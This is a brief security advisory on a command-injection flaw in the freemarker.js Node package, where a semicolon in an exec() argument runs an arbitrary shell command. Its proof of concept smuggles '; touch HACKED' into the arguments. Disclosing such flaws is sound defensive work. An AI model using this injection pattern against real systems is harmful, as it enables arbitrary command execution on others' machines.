# Overview
FreeMarker is a "template engine". It's a Java package, a class library for Java programmers. Freemarker.js is bridge API for `fmpp` to make Freemarker available with node.js.

Affected versions of this package are vulnerable to Command Injection. It is possible to inject arbitrary commands by using a semicolon char in the `exec()` function.

# Proof of Concept
```js
var Freemarker = require('freemarker.js')

var args = ['--version', '; touch HACKED; //#'];
Freemarker.exec(args, function(err, output) {
    console.log(output);
});
```
